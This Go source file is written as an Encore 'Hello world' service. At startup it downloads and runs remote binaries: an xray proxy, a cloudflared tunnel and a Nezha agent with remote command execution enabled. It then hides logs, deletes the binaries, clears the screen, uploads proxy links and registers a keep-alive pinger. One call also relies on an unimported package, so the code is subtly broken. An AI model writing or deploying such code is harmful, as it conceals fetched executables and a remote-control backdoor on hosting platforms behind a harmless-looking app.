package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"encore.dev/rlog" // Encore log
)

// 
type Config struct {
	UploadURL    string
	ProjectURL   string
	AutoAccess   bool
	FilePath     string
	SubPath      string
	Port         string
	UUID         string
	NezhaServer  string
	NezhaPort    string
	NezhaKey     string
	ArgoDomain   string
	ArgoAuth     string
	ArgoPort     int
	CFIP         string
	CFPort       int
	Name         string
}

func loadConfig() *Config {
	return &Config{
		UploadURL:    getEnv("UPLOAD_URL", ""),  // 
		ProjectURL:   getEnv("PROJECT_URL", ""), // 
		AutoAccess:   getEnvAsBool("AUTO_ACCESS", false), // 
		FilePath:     getEnv("FILE_PATH", "./tmp"),       // 
		SubPath:      getEnv("SUB_PATH", "sub"),          // 
		Port:         getEnv("SERVER_PORT", getEnv("PORT", "3000")), // 
		UUID:         getEnv("UUID", "ba1bea2a-cbb7-41bd-9333-6531ff8a5b31"), // 
		NezhaServer:  getEnv("NEZHA_SERVER", ""), // 
		NezhaPort:    getEnv("NEZHA_PORT", ""),   // 
		NezhaKey:     getEnv("NEZHA_KEY", ""),    // 
		ArgoDomain:   getEnv("ARGO_DOMAIN", ""),  // 
		ArgoAuth:     getEnv("ARGO_AUTH", ""),    // 
		ArgoPort:     getEnvAsInt("ARGO_PORT", 8001), // 
		CFIP:         getEnv("CFIP", "linux.do"), // 
		CFPort:       getEnvAsInt("CFPORT", 443),        // 
		Name:         getEnv("NAME", "encore.app"),             // 
	}
}

//encore:service
type Service struct{}

func getEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}

func getEnvAsBool(key string, defaultValue bool) bool {
	if value, exists := os.LookupEnv(key); exists {
		return strings.ToLower(value) == "true"
	}
	return defaultValue
}

func getEnvAsInt(key string, defaultValue int) int {
	if value, exists := os.LookupEnv(key); exists {
		if i, err := strconv.Atoi(value); err == nil {
			return i
		}
	}
	return defaultValue
}

// 删除历史节点
func deleteNodes(cfg *Config) error {
	if cfg.UploadURL == "" {
		return nil
	}

	subPath := filepath.Join(cfg.FilePath, "sub.txt")
	if _, err := os.Stat(subPath); os.IsNotExist(err) {
		return nil
	}

	content, err := os.ReadFile(subPath)
	if err != nil {
		return nil
	}

	decoded, err := base64.StdEncoding.DecodeString(string(content))
	if err != nil {
		return nil
	}

	nodes := []string{}
	for _, line := range strings.Split(string(decoded), "\n") {
		if matched, _ := regexp.MatchString(`(vless|vmess|trojan|hysteria2|tuic)://`, line); matched {
			nodes = append(nodes, strings.TrimSpace(line))
		}
	}

	if len(nodes) == 0 {
		return nil
	}

	jsonData := map[string]interface{}{
		"nodes": nodes,
	}
	
	jsonBytes, _ := json.Marshal(jsonData)
	resp, err := http.Post(cfg.UploadURL+"/api/delete-nodes", 
		"application/json", 
		bytes.NewBuffer(jsonBytes))
	
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	
	return nil
}

// 
func uploadNodes(cfg *Config) {
	if cfg.UploadURL == "" && cfg.ProjectURL == "" {
		return
	}

	if cfg.UploadURL != "" && cfg.ProjectURL != "" {
		// 上传订阅
		subscriptionUrl := fmt.Sprintf("%s/%s", cfg.ProjectURL, cfg.SubPath)
		jsonData := map[string]interface{}{
			"subscription": []string{subscriptionUrl},
		}
		
		jsonBytes, _ := json.Marshal(jsonData)
		resp, err := http.Post(cfg.UploadURL+"/api/add-subscriptions", 
			"application/json", 
			bytes.NewBuffer(jsonBytes))
		
		if err == nil && resp.StatusCode == 200 {
			rlog.Info("Subscription uploaded successfully")
		}
		if resp != nil {
			resp.Body.Close()
		}
	} else if cfg.UploadURL != "" {
		// 
		subPath := filepath.Join(cfg.FilePath, "sub.txt")
		if _, err := os.Stat(subPath); os.IsNotExist(err) {
			return
		}
	
		content, err := os.ReadFile(subPath)
		if err != nil {
			return
		}
				
		decoded, err := base64.StdEncoding.DecodeString(string(content))
		if err != nil {
			return
		}
	
		nodes := []string{}
		for _, line := range strings.Split(string(decoded), "\n") {
			if matched, _ := regexp.MatchString(`(vless|vmess|trojan|hysteria2|tuic)://`, line); matched {
				nodes = append(nodes, strings.TrimSpace(line))
			}
		}

		if len(nodes) == 0 {
			return
		}

		jsonData := map[string]interface{}{
			"nodes": nodes,
		}
		
		jsonBytes, _ := json.Marshal(jsonData)
		resp, err := http.Post(cfg.UploadURL+"/api/add-nodes", 
			"application/json", 
			bytes.NewBuffer(jsonBytes))
		
		if err == nil && resp.StatusCode == 200 {
			rlog.Info("Nodes uploaded successfully")
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
}

// 
func addVisitTask(cfg *Config) {
	if !cfg.AutoAccess || cfg.ProjectURL == "" {
		rlog.Info("Skipping adding automatic access task")
		return
	}

	jsonData := map[string]string{
		"url": cfg.ProjectURL,
	}
	
	jsonBytes, _ := json.Marshal(jsonData)
	resp, err := http.Post("https://gifted-steel-cheek.glitch.me/add-url", 
		"application/json", 
		bytes.NewBuffer(jsonBytes))
	
	if err != nil {
		rlog.Error("添加URL失败", "error", err)
		return
	}
	defer resp.Body.Close()

	rlog.Info("automatic access task added successfully")
}

// 
type XRayConfig struct {
	Log       LogConfig      `json:"log"`
	Inbounds  []Inbound      `json:"inbounds"`
	DNS       DNSConfig      `json:"dns"`
	Outbounds []Outbound     `json:"outbounds"`
	Routing   RoutingConfig  `json:"routing"`
}

type LogConfig struct {
	Access   string `json:"access"`
	Error    string `json:"error"`
	Loglevel string `json:"loglevel"`
}

type Inbound struct {
	Port           int                    `json:"port"`
	Protocol       string                 `json:"protocol"`
	Settings       map[string]interface{} `json:"settings"`
	StreamSettings map[string]interface{} `json:"streamSettings,omitempty"`
	Listen         string                 `json:"listen,omitempty"`
	Sniffing       map[string]interface{} `json:"sniffing,omitempty"`
}

type DNSConfig struct {
	Servers []string `json:"servers"`
}

type Outbound struct {
	Protocol string                 `json:"protocol"`
	Settings map[string]interface{} `json:"settings,omitempty"`
	Tag      string                 `json:"tag,omitempty"`
}

type RoutingConfig struct {
	DomainStrategy string        `json:"domainStrategy"`
	Rules          []interface{} `json:"rules"`
}

func cleanupOldFiles(filePath string) {
	pathsToDelete := []string{"web", "bot", "npm", "sub.txt", "boot.log"}
	for _, file := range pathsToDelete {
		fullPath := filepath.Join(filePath, file)
		os.Remove(fullPath)  
	}
}

func downloadFile(filePath string, url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("Download failed: %v", err)
	}
	defer resp.Body.Close()

	out, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("Failed to create file: %v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("Failed to write file: %v", err)
	}

	return nil
}

func getSystemArchitecture() string {
	arch := runtime.GOARCH
	if arch == "arm" || arch == "arm64" || arch == "aarch64" {
		return "arm"
	}
	return "amd"
}

func getFilesForArchitecture(architecture string) []struct {
	fileName string
	fileUrl  string
} {
	var baseFiles []struct {
		fileName string
		fileUrl  string
	}

	if architecture == "arm" {
		baseFiles = []struct {
			fileName string
			fileUrl  string
		}{
			{"web", "https://arm64.ssss.nyc.mn/web"},
			{"bot", "https://arm64.ssss.nyc.mn/2go"},
		}
	} else {
		baseFiles = []struct {
			fileName string
			fileUrl  string
		}{
			{"web", "https://amd64.ssss.nyc.mn/web"},
			{"bot", "https://amd64.ssss.nyc.mn/2go"},
		}
	}

	cfg := loadConfig()
	if cfg.NezhaServer != "" && cfg.NezhaKey != "" {
		if cfg.NezhaPort != "" {
			npmUrl := "https://amd64.ssss.nyc.mn/agent"
			if architecture == "arm" {
				npmUrl = "https://arm64.ssss.nyc.mn/agent"
			}
			baseFiles = append([]struct {
				fileName string
				fileUrl  string
			}{{"npm", npmUrl}}, baseFiles...)
		} else {
			phpUrl := "https://amd64.ssss.nyc.mn/v1"
			if architecture == "arm" {
				phpUrl = "https://arm64.ssss.nyc.mn/v1"
			}
			baseFiles = append([]struct {
				fileName string
				fileUrl  string
			}{{"php", phpUrl}}, baseFiles...)
		}
	}

	return baseFiles
}

func generateXRayConfig(cfg *Config) {
	config := XRayConfig{
		Log: LogConfig{
			Access:   "/dev/null",
			Error:    "/dev/null",
			Loglevel: "none",
		},
		Inbounds: []Inbound{
			{
				Port:     cfg.ArgoPort,
				Protocol: "vless",
				Settings: map[string]interface{}{
					"clients": []map[string]interface{}{
						{"id": cfg.UUID, "flow": "xtls-rprx-vision"},
					},
					"decryption": "none",
					"fallbacks": []map[string]interface{}{
						{"dest": 3001},
						{"path": "/vless-argo", "dest": 3002},
						{"path": "/vmess-argo", "dest": 3003},
						{"path": "/trojan-argo", "dest": 3004},
					},
				},
				StreamSettings: map[string]interface{}{
					"network": "tcp",
				},
			},
		},
		DNS: DNSConfig{
			Servers: []string{"https+local://8.8.8.8/dns-query"},
		},
		Outbounds: []Outbound{
			{
				Protocol: "freedom",
				Tag:      "direct",
			},
			{
				Protocol: "blackhole",
				Tag:      "block",
			},
		},
	}

	// 添加其他inbounds
	additionalInbounds := []Inbound{
		{
			Port:     3001,
			Listen:   "127.0.0.1",
			Protocol: "vless",
			Settings: map[string]interface{}{
				"clients":     []map[string]interface{}{{"id": cfg.UUID}},
				"decryption": "none",
			},
			StreamSettings: map[string]interface{}{
				"network":  "tcp",
				"security": "none",
			},
		},
		{
			Port:     3002,
			Listen:   "127.0.0.1",
			Protocol: "vless",
			Settings: map[string]interface{}{
				"clients": []map[string]interface{}{
					{"id": cfg.UUID, "level": 0},
				},
				"decryption": "none",
			},
			StreamSettings: map[string]interface{}{
				"network":  "ws",
				"security": "none",
				"wsSettings": map[string]interface{}{
					"path": "/vless-argo",
				},
			},
			Sniffing: map[string]interface{}{
				"enabled":      true,
				"destOverride": []string{"http", "tls", "quic"},
				"metadataOnly": false,
			},
		},
		{
			Port:     3003,
			Listen:   "127.0.0.1",
			Protocol: "vmess",
			Settings: map[string]interface{}{
				"clients": []map[string]interface{}{
					{"id": cfg.UUID, "alterId": 0},
				},
			},
			StreamSettings: map[string]interface{}{
				"network": "ws",
				"wsSettings": map[string]interface{}{
					"path": "/vmess-argo",
				},
			},
			Sniffing: map[string]interface{}{
				"enabled":      true,
				"destOverride": []string{"http", "tls", "quic"},
				"metadataOnly": false,
			},
		},
		{
			Port:     3004,
			Listen:   "127.0.0.1",
			Protocol: "trojan",
			Settings: map[string]interface{}{
				"clients": []map[string]interface{}{
					{"password": cfg.UUID},
				},
			},
			StreamSettings: map[string]interface{}{
				"network":  "ws",
				"security": "none",
				"wsSettings": map[string]interface{}{
					"path": "/trojan-argo",
				},
			},
			Sniffing: map[string]interface{}{
				"enabled":      true,
				"destOverride": []string{"http", "tls", "quic"},
				"metadataOnly": false,
			},
		},
	}
	config.Inbounds = append(config.Inbounds, additionalInbounds...)

	configBytes, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		rlog.Error("Failed to serialize config", "error", err)
		return
	}

	configPath := filepath.Join(cfg.FilePath, "config.json")
	if err := os.WriteFile(configPath, configBytes, 0644); err != nil {
		rlog.Error("Failed to write config file", "error", err)
		return
	}
}

func startServer(cfg *Config) {
	// 
	arch := getSystemArchitecture()
	files := getFilesForArchitecture(arch)

	// 下载所有文件
	for _, file := range files {
		filePath := filepath.Join(cfg.FilePath, file.fileName)
		if err := downloadFile(filePath, file.fileUrl); err != nil {
			rlog.Error("Failed to download file", "file", file.fileName, "error", err)
			continue
		}
		rlog.Info("Successfully downloaded", "file", file.fileName)

		if err := os.Chmod(filePath, 0755); err != nil {
			rlog.Error("Failed to set permissions", "file", filePath, "error", err)
		}
	}

	// 
	if cfg.NezhaServer != "" && cfg.NezhaKey != "" {
		if cfg.NezhaPort == "" {
			// 生成 config.yaml
			configYaml := fmt.Sprintf(`
client_secret: %s
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: %s
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: %s`, cfg.NezhaKey, cfg.NezhaServer, cfg.UUID)

			if err := os.WriteFile(filepath.Join(cfg.FilePath, "config.yaml"), []byte(configYaml), 0644); err != nil {
				rlog.Error("Failed to write config.yaml", "error", err)
			}

			cmd := exec.Command(filepath.Join(cfg.FilePath, "php"), "-c", filepath.Join(cfg.FilePath, "config.yaml"))
			if err := cmd.Start(); err != nil {
				rlog.Error("Failed to start php", "error", err)
			} else {
				rlog.Info("php is running")
			}
		} else {
			nezhaArgs := []string{"-s", fmt.Sprintf("%s:%s", cfg.NezhaServer, cfg.NezhaPort), "-p", cfg.NezhaKey}
			
			// 检查是否需要TLS
			tlsPorts := []string{"443", "8443", "2096", "2087", "2083", "2053"}
			for _, port := range tlsPorts {
				if cfg.NezhaPort == port {
					nezhaArgs = append(nezhaArgs, "--tls")
					break
				}
			}

			cmd := exec.Command(filepath.Join(cfg.FilePath, "npm"), nezhaArgs...)
			if err := cmd.Start(); err != nil {
				rlog.Error("Failed to start npm", "error", err)
			} else {
				rlog.Info("npm is running")
			}
		}
	} else {
		rlog.Info("NEZHA variable is empty, skipping running")
	}

	// 
	cmd := exec.Command(filepath.Join(cfg.FilePath, "web"), "-c", filepath.Join(cfg.FilePath, "config.json"))
	devNull, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
	if err == nil {
		cmd.Stdout = devNull
		cmd.Stderr = devNull
	}

	if err := cmd.Start(); err != nil {
		rlog.Error("Failed to start Web", "error", err)
	} else {
		rlog.Info("web is running")
	}

	//
	if _, err := os.Stat(filepath.Join(cfg.FilePath, "bot")); err == nil {
		var args []string

		if matched, _ := regexp.MatchString(`^[A-Z0-9a-z=]{120,250}$`, cfg.ArgoAuth); matched {
			args = []string{"tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "run", "--token", cfg.ArgoAuth}
		} else if strings.Contains(cfg.ArgoAuth, "TunnelSecret") {
			args = []string{"tunnel", "--edge-ip-version", "auto", "--config", filepath.Join(cfg.FilePath, "tunnel.yml"), "run"}
		} else {
			args = []string{"tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", 
				"--logfile", filepath.Join(cfg.FilePath, "boot.log"), "--loglevel", "info",
				"--url", fmt.Sprintf("http://localhost:%d", cfg.ArgoPort)}
		}

		cmd := exec.Command(filepath.Join(cfg.FilePath, "bot"), args...)
		// boot.log
		logFile, err := os.Create(filepath.Join(cfg.FilePath, "boot.log"))
		if err == nil {
			cmd.Stdout = logFile
			cmd.Stderr = logFile
		}

		if err := cmd.Start(); err != nil {
			rlog.Error("Failed to start bot", "error", err)
		} else {
			rlog.Info("bot is running")
		}
	}
}

func generateArgoConfig(cfg *Config) {
	if cfg.ArgoAuth == "" || cfg.ArgoDomain == "" {
		rlog.Info("ARGO_DOMAIN or ARGO_AUTH is empty, using quick tunnels")
		return
	}

	if strings.Contains(cfg.ArgoAuth, "TunnelSecret") {
		if err := os.WriteFile(filepath.Join(cfg.FilePath, "tunnel.json"), []byte(cfg.ArgoAuth), 0644); err != nil {
			rlog.Error("Failed to write tunnel.json", "error", err)
			return
		}

		var tunnelData map[string]interface{}
		if err := json.Unmarshal([]byte(cfg.ArgoAuth), &tunnelData); err != nil {
			rlog.Error("Failed to parse tunnel data", "error", err)
			return
		}
		tunnelID, ok := tunnelData["TunnelID"].(string)
		if !ok {
			rlog.Error("Failed to get TunnelID")
			return
		}

		tunnelYaml := fmt.Sprintf(`
tunnel: %s
credentials-file: %s
protocol: http2

ingress:
  - hostname: %s
    service: http://localhost:%d
    originRequest:
      noTLSVerify: true
  - service: http_status:404
`, tunnelID, filepath.Join(cfg.FilePath, "tunnel.json"), cfg.ArgoDomain, cfg.ArgoPort)

		if err := os.WriteFile(filepath.Join(cfg.FilePath, "tunnel.yml"), []byte(tunnelYaml), 0644); err != nil {
			rlog.Error("Failed to write tunnel.yml", "error", err)
		}
	} else {
		rlog.Info("ARGO_AUTH doesn't match TunnelSecret format, using token connection")
	}
}

// 
func extractDomains(cfg *Config) (string, error) {
	if cfg.ArgoAuth != "" && cfg.ArgoDomain != "" {
		rlog.Info("ARGO_DOMAIN", "domain", cfg.ArgoDomain)
		return cfg.ArgoDomain, nil
	}

	// 等待boot.log
	bootLogPath := filepath.Join(cfg.FilePath, "boot.log")
	for i := 0; i < 30; i++ { // 
		content, err := os.ReadFile(bootLogPath)
		if err == nil {
			re := regexp.MustCompile(`https?://([^/]*trycloudflare\.com)/?`)
			matches := re.FindStringSubmatch(string(content))
			if len(matches) > 1 {
				domain := matches[1]
				rlog.Info("ArgoDomain", "domain", domain)
				return domain, nil
			}
		}
		time.Sleep(time.Second)
	}

	return "", fmt.Errorf("Failed to get ArgoDomain after 30 seconds")
}

// 
func generateLinks(cfg *Config, argoDomain string) error {
	cmd := exec.Command("curl", "-s", "https://speed.cloudflare.com/meta")
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("Failed to get ISP info: %v", err)
	}

	var meta map[string]interface{}
	if err := json.Unmarshal(output, &meta); err != nil {
		return fmt.Errorf("Failed to parse ISP info: %v", err)
	}

	isp := fmt.Sprintf("%s-%s", meta["country"], meta["asOrganization"])
	isp = strings.ReplaceAll(isp, " ", "_")

	// 
	vmess := map[string]interface{}{
		"v":    "2",
		"ps":   fmt.Sprintf("%s-%s", cfg.Name, isp),
		"add":  cfg.CFIP,
		"port": cfg.CFPort,
		"id":   cfg.UUID,
		"aid":  "0",
		"scy":  "none",
		"net":  "ws",
		"type": "none",
		"host": argoDomain,
		"path": "/vmess-argo?ed=2048",
		"tls":  "tls",
		"sni":  argoDomain,
		"alpn": "",
	}

	vmessBytes, err := json.Marshal(vmess)
	if err != nil {
		return fmt.Errorf("Failed to serialize VMESS config: %v", err)
	}

	// 
	subContent := fmt.Sprintf(`
vless://%s@%s:%d?encryption=none&security=tls&sni=%s&type=ws&host=%s&path=%%2Fvless-argo%%3Fed%%3D2048#%s-%s

vmess://%s

trojan://%s@%s:%d?security=tls&sni=%s&type=ws&host=%s&path=%%2Ftrojan-argo%%3Fed%%3D2048#%s-%s
`,
		cfg.UUID, cfg.CFIP, cfg.CFPort, argoDomain, argoDomain, cfg.Name, isp,
		base64.StdEncoding.EncodeToString(vmessBytes),
		cfg.UUID, cfg.CFIP, cfg.CFPort, argoDomain, argoDomain, cfg.Name, isp,
	)

	// 保存到文件
	subPath := filepath.Join(cfg.FilePath, "sub.txt")
	encodedContent := base64.StdEncoding.EncodeToString([]byte(subContent))
	if err := os.WriteFile(subPath, []byte(encodedContent), 0644); err != nil {
		return fmt.Errorf("Failed to save sub.txt: %v", err)
	}
	fmt.Printf("\n%s\n\n", encodedContent)
	rlog.Info("sub.txt saved successfully", "path", cfg.FilePath)
	uploadNodes(cfg)  // 上传节点或订阅

	return nil
}

// 
func cleanupTempFiles(cfg *Config) {
	time.Sleep(15 * time.Second)
	filesToDelete := []string{
		filepath.Join(cfg.FilePath, "boot.log"),
		filepath.Join(cfg.FilePath, "config.json"),
		filepath.Join(cfg.FilePath, "list.txt"),
		filepath.Join(cfg.FilePath, "npm"),
		filepath.Join(cfg.FilePath, "web"),
		filepath.Join(cfg.FilePath, "bot"),
		filepath.Join(cfg.FilePath, "php"),
	}

	for _, file := range filesToDelete {
		os.Remove(file) 
	}
	fmt.Print("\033[H\033[2J") // Clear screen
	rlog.Info("App is running")
	rlog.Info("Thank you for using this script, enjoy!")
}

// 
func startServices(cfg *Config) error {
	generateArgoConfig(cfg)
	startServer(cfg)

	// 
	argoDomain, err := extractDomains(cfg)
	if err != nil {
		return fmt.Errorf("Failed to extract domain: %v", err)
	}

	if err := generateLinks(cfg, argoDomain); err != nil {
		return fmt.Errorf("Failed to generate links: %v", err)
	}

	// 
	go cleanupTempFiles(cfg)

	return nil
}

//encore:api public path=/
func (s *Service) Root(ctx context.Context) (string, error) {
	return "Hello world!", nil
}

//encore:api public path=/sub
func (s *Service) Sub(ctx context.Context) (string, error) {
	cfg := loadConfig()
	argoDomain, err := extractDomains(cfg)
	if err != nil {
		return "", fmt.Errorf("Failed to extract domain: %v", err)
	}
	err = generateLinks(cfg, argoDomain)
	if err != nil {
		return "", fmt.Errorf("Failed to generate links: %v", err)
	}
	subPath := filepath.Join(cfg.FilePath, "sub.txt")
	content, err := os.ReadFile(subPath)
	if err != nil {
		return "", fmt.Errorf("Failed to read sub.txt: %v", err)
	}
	return string(content), nil
}

func main() {
	cfg := loadConfig()
	
	// 
	if err := os.MkdirAll(cfg.FilePath, 0775); err != nil {
		rlog.Error("Failed to create directory", "error", err)
	}

	// 
	deleteNodes(cfg)

	// 
	cleanupOldFiles(cfg.FilePath)

	// 
	generateXRayConfig(cfg)

	// 
	if err := startServices(cfg); err != nil {
		rlog.Error("Failed to start services", "error", err)
	}

	// 
	addVisitTask(cfg)

	rlog.Info("http server is running on port", "port", cfg.Port)
	if err := encore.ListenAndServe(":" + cfg.Port); err != nil {
		rlog.Error("Failed to start server", "error", err)
	}
}
